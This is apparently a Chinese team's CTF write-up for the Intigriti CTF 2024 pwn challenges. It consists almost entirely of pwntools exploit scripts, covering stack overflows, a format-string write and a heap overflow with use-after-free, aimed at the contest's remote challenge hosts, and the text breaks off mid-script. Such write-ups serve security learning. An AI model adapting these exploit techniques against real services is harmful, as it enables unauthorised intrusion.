---
title: Intigriti CTF 2024  by Mini-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511590&idx=1&sn=c3aeb9501708d754aaee0aed2bda0b6a&chksm=e89d86fedfea0fe85936b1f6415edec0794f9859979b06ffde8530daf55e455595b7ddd749d2&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-11-19
fetch_date: 2025-10-06T19:18:57.295773
---

# Intigriti CTF 2024  by Mini-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBSd9GKV5icLFYnXibkzQBVibcZ01fevIfrI6smqTqIgjzxEGbniblAJRr48ibDpUjQEUQTOiagdPFFlBHTw/0?wx_fmt=jpeg)

# Intigriti CTF 2024 by Mini-Venom

原创

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## Pwn:

### Rigged Slot Machine 2

溢出，满足条件

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('riggedslot2.ctf.intigriti.io',1337)
#p = process('./pwn')

rl("Enter your name:")
payload=b'a'*20+p32(0x14684d)+p32(1)
#bug()
sl(payload)

rl("per spin): ")
sl(str(1))
inter()
```

### Retro2Win

溢出，打后门

```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('retro2win.ctf.intigriti.io',1338)
#p = process('./pwn')
rdi=0x00000000004009b3
main=0x4008B7
rl("Select an option:")
sl(str(1337))
rl("Enter your cheatcode:")
payload=b'\x00'*(0x10)+p64(0x602070+0x500)+p64(0x40076A)
#bug()
sl(payload)

inter()
```

### Floormat Mega Sale

fmt

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('floormatsale.ctf.intigriti.io',1339)
#p = process('./pwn')
addr=0x40408C
rl("\nEnter your choice:")
sl(str(6))
rl("\nPlease enter your shipping address:")
payload=fmtstr_payload(10,{addr:1})

sl(payload)

inter()
```

### UAP

堆溢出+uaf直接打

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('uap.ctf.intigriti.io',1340)
#p = process('./pwn')

def add():
        rl("5. Exit")
        sl(str(1))
def free(i):
        rl("5. Exit")
        sl(str(2))
        sleep(0.1)
        sl(str(i))
def show(i):
        rl("5. Exit")
        sl(str(3))
        sleep(0.1)
        sl(str(i))
def add1(content):
        rl("5. Exit")
        sl(str(4))
        sleep(0.1)
        sl(content)

add()
add()
add()

free(1)
add1(b'a'*(0x10)+p64(0x400836)*2)
#bug()
show(1)

#bug()

inter()
```

### Notepad

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',...